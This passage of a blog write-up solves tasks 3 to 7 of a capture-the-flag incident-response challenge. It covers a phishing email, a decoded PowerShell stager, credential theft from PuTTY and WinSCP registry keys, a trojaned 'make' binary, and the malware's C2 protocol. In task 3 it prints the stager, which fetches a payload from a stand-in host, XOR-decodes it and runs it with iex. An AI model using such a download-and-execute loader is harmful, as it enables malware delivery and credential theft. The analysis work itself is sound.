&lt;p>&lt;strong>LogonId: 0X33946D&lt;/strong>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h1 id="task-3" >Task 3
&lt;span>
&lt;a href="#task-3">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>With the provided information, OOPS was quickly able to identify the employee associated with the account. During the incident response interview, the user mentioned that they would have been checking email around the time that the communication occurred. They don&amp;rsquo;t remember anything particularly weird from earlier, but it was a few weeks back, so they&amp;rsquo;re not sure. OOPS has provided a subset of the user&amp;rsquo;s inbox from the day of the communication.&lt;/p>
&lt;p>Identify the message ID of the malicious email and the targeted server.&lt;/p>
&lt;p>Downloads:&lt;/p>
&lt;ul>
&lt;li>User&amp;rsquo;s emails (emails.zip)&lt;/li>
&lt;/ul>
&lt;h1 id="solution-2" >Solution
&lt;span>
&lt;a href="#solution-2">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;ol>
&lt;li>
&lt;p>unzip emails&lt;/p>
&lt;/li>
&lt;li>
&lt;p>use ripmime to extract all the attachments
a. for i in *; do ripmime -i $i -d attachment_$i; done;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>further see what kind of attachments are within each email message
a. file attachment*/*&lt;/p>
&lt;/li>
&lt;li>
&lt;p>oh the oopsie_update.pptx is not actually a powerpoint file&amp;hellip; it&amp;rsquo;s ASCII text&lt;/p>
&lt;/li>
&lt;li>
&lt;p>cat oopsie_update.pptx and see a powershell command to an &amp;ldquo;-enc&amp;rdquo; which sends a base64 string (which we know because of the &amp;ldquo;==&amp;rdquo; at the end&lt;/p>
&lt;/li>
&lt;li>
&lt;p>use cyberchef to decode the bas64 to see:
$bytes = (New-Object Net.WebClient).DownloadData(&amp;lsquo;&lt;a href="http://xomtq.invalid/analysis'">http://xomtq.invalid/analysis'&lt;/a>)&lt;/p>
&lt;p>$prev = [byte] 173&lt;/p>
&lt;p>$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
$prev = $bytes[$i] -bxor $prev
$prev
})&lt;/p>
&lt;p>iex([System.Text.Encoding]::UTF8.GetString($dec))&lt;/p>
&lt;/li>
&lt;li>
&lt;p>we see it is downloading data, but notice that xomtq.invalid doesn&amp;rsquo;t work so we gotta look more into it&amp;hellip; we see that we should look at the HEX stream from the 200 HTTP request&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Booting up VS Code, we need to write a script that takes the hex_val stream and put it into byte format, which we do via unhexlify&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Next we do the same operation that is being done in the ASCII text from step 6 but in Python&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Make sure to join all the items in the list and print it out, we get a huge powershell script and output that to fullpowershell.txt and then see at the bottom a POST request sent to &lt;a href="http://wtmbi.invalid:8080">http://wtmbi.invalid:8080&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>going back to message_9.eml, I used &amp;ldquo;head message_9.eml&amp;rdquo; to find the Message-ID as &lt;a href="mailto:161584985300.22130.15351049748726194876@oops.net">161584985300.22130.15351049748726194876@oops.net&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Submit Message-ID and domain name to the challenge (wtmbi.invalid) and SUCCESS&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h1 id="task-4" >Task 4
&lt;span>
&lt;a href="#task-4">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>A number of OOPS employees fell victim to the same attack, and we need to figure out what&amp;rsquo;s been compromised! Examine the malware more closely to understand what it&amp;rsquo;s doing. Then, use these artifacts to determine which account on the OOPS network has been compromised.&lt;/p>
&lt;p>Downloads:&lt;/p>
&lt;ul>
&lt;li>OOPS forensic artifacts (artifacts.zip)&lt;/li>
&lt;/ul>
&lt;h2 id="solution-3" >Solution
&lt;span>
&lt;a href="#solution-3">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;ol>
&lt;li>
&lt;p>look at the fullpowershell.txt from last and identify what it is doing&lt;/p>
&lt;p>a. you see that it is going into specific registries (PuTTY and WinSCP)&lt;/p>
&lt;p>b. identify what is being taken for each registry&lt;/p>
&lt;ul>
&lt;li>
&lt;p>PuTTY -&amp;gt; Source, Session, Hostname, Keyfile&lt;/p>
&lt;/li>
&lt;li>
&lt;p>WinSCP -&amp;gt; Source, Session, Hostname, Username, Password&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>So now you know what is being taken and you know that the prettyXML.xml contains the registries -&amp;gt; next need to figure out how to find the right data&lt;/p>
&lt;p>a. looking at the differences amongst the artifacts (only the ppks bc those are PuTTY private keys), you notice that some do NOT use any encryption -&amp;gt; this means that it is easier for a hacker to exploit (dkr_prd93, dkr_prd54, dkr_tst67, dkr_tst70, dkr_tst76)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>looking into the XML file, we search for the dkr that are not encrypted, you find a node within with dkr_prd93 yayyyy (builder07@dkr_prd93)&lt;/p>
&lt;p>a. machine name = dkr_prd93&lt;/p>
&lt;p>b. builder07&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h1 id="task-5" >Task 5
&lt;span>
&lt;a href="#task-5">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>A forensic analysis of the server you identified reveals suspicious logons shortly after the malicious emails were sent. Looks like the actor moved deeper into OOPS&amp;rsquo; network. Yikes.&lt;/p>
&lt;p>The server in question maintains OOPS' Docker image registry, which is populated with images created by OOPS clients. The images are all still there (phew!), but one of them has a recent modification date: an image created by the Prevention of Adversarial Network Intrusions Conglomerate (PANIC).&lt;/p>
&lt;p>Due to the nature of PANIC&amp;rsquo;s work, they have a close partnership with the FBI. They&amp;rsquo;ve also long been a target of both government and corporate espionage, and they invest heavily in security measures to prevent access to their proprietary information and source code.&lt;/p>
&lt;p>The FBI, having previously worked with PANIC, have taken the lead in contacting them. The FBI notified PANIC of the potential compromise and reminded them to make a report to DC3. During conversations with PANIC, the FBI learned that the image in question is part of their nightly build and test pipeline. PANIC reported that nightly build and regression tests had been taking longer than usual, but they assumed it was due to resourcing constraints on OOPS' end. PANIC consented to OOPS providing FBI with a copy of the Docker image in question.&lt;/p>
&lt;p>Analyze the provided Docker image and identify the actor&amp;rsquo;s techniques.&lt;/p>
&lt;p>Downloads:&lt;/p>
&lt;ul>
&lt;li>PANIC Nightly Build + Test Docker Image (image.tar)&lt;/li>
&lt;/ul>
&lt;h2 id="solution-4" >Solution
&lt;span>
&lt;a href="#solution-4">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;ol>
&lt;li>
&lt;p>look at the manifest.json to find &amp;ldquo;maintainer&amp;rdquo; email (use &amp;ldquo;cat manifest.json | jq&amp;rdquo;)&lt;/p>
&lt;p>a. jq is a nice thing to show json in pretty format (can pipe output to a new json)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>tar -xf all the layer.tar files in each folder&lt;/p>
&lt;p>a. rg &amp;lsquo;git clone&amp;rsquo; and look for the git clone url that is connected to a sus file &amp;ldquo;build_test.sh&amp;rdquo;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>so most malicious files are binaries, so you are probably gonna be looking in &amp;ldquo;bin&amp;rdquo; directories&lt;/p>
&lt;p>a. after searching around the different directories, you find the 8e&amp;hellip; folder because it has a lot of folders&lt;/p>
&lt;p>b. you check out bin from the main directory, but find nothing in there&lt;/p>
&lt;p>c. since you didn&amp;rsquo;t find anything, you look into usr/bin&lt;/p>
&lt;ol>
&lt;li>
&lt;p>interesting, you find a lot of files&lt;/p>
&lt;/li>
&lt;li>
&lt;p>since you know malicious files/payloads are usually pretty big, you do &amp;ldquo;ls -lh&amp;rdquo; to see the file size and notice that the &lt;code>make&lt;/code> file is 8.4M so that&amp;rsquo;s probs the malicious file -&amp;gt; path is usr/bin/make&lt;/p>
&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ol>
&lt;h1 id="task-6" >Task 6
&lt;span>
&lt;a href="#task-6">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>Now that we&amp;rsquo;ve found a malicious artifact, the next step is to understand what it&amp;rsquo;s doing. Identify some characteristics of the communications between the malicious artifact and the LP.&lt;/p>
&lt;h2 id="solution-5" >Solution
&lt;span>
&lt;a href="#solution-5">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;ol>
&lt;li>
&lt;p>Open up the good ol ghidra with the file found from Task 5 (the make file)&lt;/p>
&lt;p>a. Make your way to the main function -&amp;gt; see gitGrabber() function and look into it&lt;/p>
&lt;/li>
&lt;li>
&lt;p>To find the ip -&amp;gt; there is a variable called &amp;ldquo;ip_00&amp;rdquo; and opening up GDB GEF, you can run &lt;code>rzlsqwdcbkzvl(13)&lt;/code> and get the ip as &lt;code>198.51.100.84&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>To find the version number: go into other weird function -&amp;gt; &lt;code>ospoimcwliqai&lt;/code> and see the &amp;ldquo;version_00&amp;rdquo; variable = &lt;code>0.0.0.4-MOB&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>To find the key (the hardest): &lt;code>call rzlsqwdcbkzvl(12)&lt;/code>. We used 0x12 because I manually enumerated calling this deobfuscation function (after I noticed ip_00 and version_00). &amp;ldquo;0x12&amp;rdquo; converts to 18 in decimal (&lt;a href="https://bluesock.org/~willg/dev/ascii.html">ascii table reference&lt;/a>).&lt;/p>
&lt;ul>
&lt;li>However, when you call that function, it gives you some weird gibberish:&lt;/li>
&lt;/ul>
&lt;p>&lt;code>$2 = 5555555f7d34 &amp;quot;\002f\255\063O\307Ǟv\274\064\345痾\232Rm\031\302\222\065IT\001O\034\071\347\367C3&amp;quot;&lt;/code>&lt;/p>
&lt;p>So, you have to use the GDB x command and run &lt;code>x/32xb $2&lt;/code> and then manually copy and paste each hex into a line for the submission.&lt;/p>
&lt;p>Final submission:&lt;/p>
&lt;p>&lt;code>0266ad334fc7c79e76bc34e5e97be9a526d19c292354954014f1c39e7f7433&lt;/code>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>Reference: &lt;a href="https://visualgdb.com/gdbreference/commands/x">GDB x commad&lt;/a>&lt;/p>
&lt;h2 id="alternative-solution-process" >Alternative Solution Process
&lt;span>
&lt;a href="#alternative-solution-process">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Notice that this one funtion &lt;code>rzlsqwdcbkzvl&lt;/code> takes in some int and Ghidra allows you to call functions and as you add in numbers, you find the information you want.&lt;/p>
&lt;p>&lt;img src="https://murphe22.com/posts/images/codebreaker/beginningPart.png" alt="beginning of calling function">&lt;/p>
&lt;p>&lt;img src="https://murphe22.com/posts/images/codebreaker/solve.png" alt="finding the relavent information for this challenge">&lt;/p>
&lt;h1 id="task-7---solo" >Task 7 - SOLO
&lt;span>
&lt;a href="#task-7---solo">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>With the information provided, PANIC worked with OOPS to revert their Docker image to a build prior to the compromise. Both companies are implementing additional checks to prevent a similar attack in the future.&lt;/p>
&lt;p>Meanwhile, NSA&amp;rsquo;s Cybersecurity Collaboration Center is working with DC3 to put together a Cybersecurity Advisory (CSA) for the rest of the DIB. DC3 has requested additional details about the techniques, tools, and targets of the cyber actor.&lt;/p>
&lt;p>To get a better understanding of the techniques being used, we need to be able to connect to the listening post. Using the knowledge and material from previous tasks, analyze the protocol clients use to communicate with the LP. Our analysts believe the protocol includes an initial crypt negotiation followed by a series of client-generated requests, which the LP responds to. Provide the plaintext a client would send to initialize a new session with the provided UUID.&lt;/p>
&lt;p>Downloads:&lt;/p>
&lt;ul>
&lt;li>Victim ID to use in initialization message (victim_id)&lt;/li>
&lt;/ul>
&lt;h2 id="solution-6" >Solution
&lt;span>
&lt;a href="#solution-6">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Gotta allocate memory for the string.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c++" data-lang="c++">gef➤ call (string &lt;span style="color:#ff79c6">*&lt;/span>) malloc(&lt;span style="color:#ff79c6">sizeof&lt;/span>(std&lt;span style="color:#ff79c6">::&lt;/span>string))
$&lt;span style="color:#bd93f9">3&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> (std&lt;span style="color:#ff79c6">::&lt;/span>string &lt;span style="color:#ff79c6">*&lt;/span>) &lt;span style="color:#bd93f9">0x555555da4e10&lt;/span>
gef➤ call ((std&lt;span style="color:#ff79c6">::&lt;/span>string&lt;span style="color:#ff79c6">*&lt;/span>)&lt;span style="color:#bd93f9">0x555555da4e10&lt;/span>)&lt;span style="color:#ff79c6">-&amp;gt;&lt;/span>basic_string()
gef➤ call ((std&lt;span style="color:#ff79c6">::&lt;/span>string&lt;span style="color:#ff79c6">*&lt;/span>)&lt;span style="color:#bd93f9">0x555555da4e10&lt;/span>)&lt;span style="color:#ff79c6">-&amp;gt;&lt;/span>assign
(&lt;span style="color:#f1fa8c">&amp;#34;4da468db-1daa-481c-9be7-d9feee42a436&amp;#34;&lt;/span>)
$&lt;span style="color:#bd93f9">4&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> (std&lt;span style="color:#ff79c6">::&lt;/span>__cxx11&lt;span style="color:#ff79c6">::&lt;/span>basic_string&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>&lt;span style="color:#8be9fd">char&lt;/span>, std&lt;span style="color:#ff79c6">::&lt;/span>char_traits&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>&lt;span style="color:#8be9fd">char&lt;/span>&lt;span style="color:#ff79c6">&amp;gt;&lt;/span>, std&lt;span style="color:#ff79c6">::&lt;/span>allocator&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>&lt;span style="color:#8be9fd">char&lt;/span>&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> &lt;span style="color:#ff79c6">&amp;gt;&lt;/span> &lt;span style="color:#ff79c6">&amp;amp;&lt;/span>) @&lt;span style="color:#bd93f9">0x555555da4e10&lt;/span>&lt;span style="color:#ff79c6">:&lt;/span> {
&lt;span style="color:#ff79c6">static&lt;/span> npos &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0xffffffffffffffff&lt;/span>,
_M_dataplus &lt;span style="color:#ff79c6">=&lt;/span> {
&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>std&lt;span style="color:#ff79c6">::&lt;/span>allocator&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>&lt;span style="color:#8be9fd">char&lt;/span>&lt;span style="color:#ff79c6">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> {
&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>__gnu_cxx&lt;span style="color:#ff79c6">::&lt;/span>new_allocator&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>&lt;span style="color:#8be9fd">char&lt;/span>&lt;span style="color:#ff79c6">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> {&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>No data fields&lt;span style="color:#ff79c6">&amp;gt;&lt;/span>}, &lt;span style="color:#ff79c6">&amp;lt;&lt;/span>No data fields&lt;span style="color:#ff79c6">&amp;gt;&lt;/span>},
members of std&lt;span style="color:#ff79c6">::&lt;/span>__cxx11&lt;span style="color:#ff79c6">::&lt;/span>basic_string&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>&lt;span style="color:#8be9fd">char&lt;/span>, std&lt;span style="color:#ff79c6">::&lt;/span>char_traits&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>&lt;span style="color:#8be9fd">char&lt;/span>&lt;span style="color:#ff79c6">&amp;gt;&lt;/span>, std&lt;span style="color:#ff79c6">::&lt;/span>allocator&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>&lt;span style="color:#8be9fd">char&lt;/span>&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> &lt;span style="color:#ff79c6">&amp;gt;::&lt;/span>&lt;span style="color:#8be9fd;font-style:italic">_Alloc_hider&lt;/span>:
_M_p &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x555555da4e70&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;4da468db-1daa-481c-9be7-d9feee42a436&amp;#34;&lt;/span>
},
_M_string_length &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x24&lt;/span>,
{
_M_local_buf &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;$&amp;#34;&lt;/span>, &lt;span style="color:#f1fa8c">&amp;#39;\000&amp;#39;&lt;/span> &lt;span style="color:#ff79c6">&amp;lt;&lt;/span>repeats &lt;span style="color:#bd93f9">14&lt;/span> times&lt;span style="color:#ff79c6">&amp;gt;&lt;/span>,
_M_allocated_capacity &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x24&lt;/span>
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now we can call the function that allocates it with the UUID&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c++" data-lang="c++">gef➤ call elcftaqudeovx(&lt;span style="color:#ff79c6">*&lt;/span>(&lt;span style="color:#ff79c6">const&lt;/span> std&lt;span style="color:#ff79c6">::&lt;/span>string&lt;span style="color:#ff79c6">*&lt;/span>)&lt;span style="color:#bd93f9">0x555555da4e10&lt;/span>,&lt;span style="color:#bd93f9">0x10&lt;/span>)
$&lt;span style="color:#bd93f9">9&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> {
&lt;span style="color:#ff79c6">static&lt;/span> npos &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0xffffffffffffffff&lt;/span>,
_M_dataplus &lt;span style="color:#ff79c6">=&lt;/span> {
&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>std&lt;span style="color:#ff79c6">::&lt;/span>allocator&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>&lt;span style="color:#8be9fd">char&lt;/span>&lt;span style="color:#ff79c6">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> {
&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>__gnu_cxx&lt;span style="color:#ff79c6">::&lt;/span>new_allocator&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>&lt;span style="color:#8be9fd">char&lt;/span>&lt;span style="color:#ff79c6">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> {&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>No data fields&lt;span style="color:#ff79c6">&amp;gt;&lt;/span>}, &lt;span style="color:#ff79c6">&amp;lt;&lt;/span>No data fields&lt;span style="color:#ff79c6">&amp;gt;&lt;/span>},
members of std&lt;span style="color:#ff79c6">::&lt;/span>__cxx11&lt;span style="color:#ff79c6">::&lt;/span>basic_string&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>&lt;span style="color:#8be9fd">char&lt;/span>, std&lt;span style="color:#ff79c6">::&lt;/span>char_traits&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>&lt;span style="color:#8be9fd">char&lt;/span>&lt;span style="color:#ff79c6">&amp;gt;&lt;/span>, std&lt;span style="color:#ff79c6">::&lt;/span>allocator&lt;span style="color:#ff79c6">&amp;lt;&lt;/span>&lt;span style="color:#8be9fd">char&lt;/span>&lt;span style="color:#ff79c6">&amp;gt;&lt;/span> &lt;span style="color:#ff79c6">&amp;gt;::&lt;/span>&lt;span style="color:#8be9fd;font-style:italic">_Alloc_hider&lt;/span>:
_M_p &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x7fffffffddf0&lt;/span> &lt;span style="color:#f1fa8c">&amp;#34;&amp;#34;&lt;/span>
},
_M_string_length &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x0&lt;/span>,
{
_M_local_buf &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;\000&amp;#39;&lt;/span> &lt;span style="color:#ff79c6">&amp;lt;&lt;/span>repeats &lt;span style="color:#bd93f9">15&lt;/span> times&lt;span style="color:#ff79c6">&amp;gt;&lt;/span>,
_M_allocated_capacity &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#bd93f9">0x0&lt;/span>
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>BUT alas, that function actually just overwrites it so fuck that. So we must just rewrite where that _M_p pointer is and put the memory address of the UUID -&amp;gt; &lt;code>set *$9._M_dataplus._M_p = 0x555555da4e10&lt;/code>&lt;/p>
&lt;p>Where does the UUID get used other than the above (elcftaqudeovx)?&lt;/p>
&lt;p>&lt;code>string * coxclamjiqjlw(string *__return_storage_ptr__,string *uuid)&lt;/code>&lt;/p>
&lt;p>Before we can call that function, it takes in a &lt;code>__return_storage_ptr__&lt;/code>. Then can do that&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c++" data-lang="c++">gef➤ call (string &lt;span style="color:#ff79c6">*&lt;/span>) malloc(&lt;span style="color:#ff79c6">sizeof&lt;/span>(std&lt;span style="color:#ff79c6">::&lt;/span>string))
$&lt;span style="color:#bd93f9">10&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> (std&lt;span style="color:#ff79c6">::&lt;/span>string &lt;span style="color:#ff79c6">*&lt;/span>) &lt;span style="color:#bd93f9">0x555555da4db0&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Calling the function was not fucking working, so I gotta edit the register and fuck with it.&lt;/p>
&lt;p>&lt;code>set $rbp-0x1a8 = 0x555555da4db0&lt;/code>&lt;/p>
&lt;p>NOW, we can call the function again and hopefully get the freaking answer.&lt;/p>
&lt;p>&lt;code>call (std::string *) (*0x5555555b2545(*0x555555da4db0,*0x555555da4e10))&lt;/code>&lt;/p>
&lt;p>Yeah so all that did not work so I instead did it statically.&lt;/p>
&lt;h2 id="static-solve" >Static Solve
&lt;span>
&lt;a href="#static-solve">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>Look at what everything is set to in ghidra within that function.&lt;/p>
&lt;p>&lt;img src="https://murphe22.com/posts/images/codebreaker/thefunction.png" alt="function of interest">&lt;/p>
&lt;p>&lt;img src="https://murphe22.com/posts/images/codebreaker/ghidraVars.png" alt="ghidra stuff">&lt;/p>
&lt;p>Alternatively, you can click on the function that is taking in that variable and see what the size is (like &lt;code>pnsikqtljaxba(&amp;amp;cmd_param,PARAM_CMD)&lt;/code>). You have to note down the size in order to correctly convert it to bytes and then back to a hex string/dump. We have to convert to bytes because that is what the program is doing to then send it to start the connection. We noticed this back when we saw how the UUID gets constructed. In the picture below, we see randombytes() so that tells us that there is a conversion of bytes.&lt;/p>
&lt;p>&lt;img src="https://murphe22.com/posts/images/codebreaker/assigningUUID.png" alt="assigning uuid">&lt;/p>
&lt;p>The parts that are sent are now defined below with the correct byte sizes.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">magic_start: &lt;span style="color:#bd93f9">1553&lt;/span>DC11
cmd_param: &lt;span style="color:#bd93f9">1700&lt;/span>
cmd_length: &lt;span style="color:#bd93f9">0002&lt;/span>
cmd_data: &lt;span style="color:#bd93f9">0002&lt;/span>
uuid_param: &lt;span style="color:#bd93f9">1708&lt;/span>
uuid_length: &lt;span style="color:#bd93f9">0010&lt;/span>
